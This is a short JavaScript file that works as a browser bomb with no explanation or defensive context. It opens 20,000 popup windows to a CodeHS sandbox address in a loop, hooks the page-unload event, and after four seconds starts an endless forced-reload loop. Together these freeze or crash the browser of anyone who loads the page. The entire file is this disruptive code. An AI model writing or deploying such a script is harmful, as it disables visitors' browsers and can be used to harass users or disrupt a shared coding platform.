function jackhammer() {
    localStorage.x = 1;
}

window.onbeforeunload = jackhammer; 


function beanCan(callback, delay) {
    setTimeout(callback, delay);
}


for (let i = 0; i < 20000; i++) {
    window.open("https://codehs.com/sandbox/id/delete-this-nWyXJb");
}


beanCan(function() {
    while (0.005 ) {
        location.reload(true); 
    }
}, 4000);
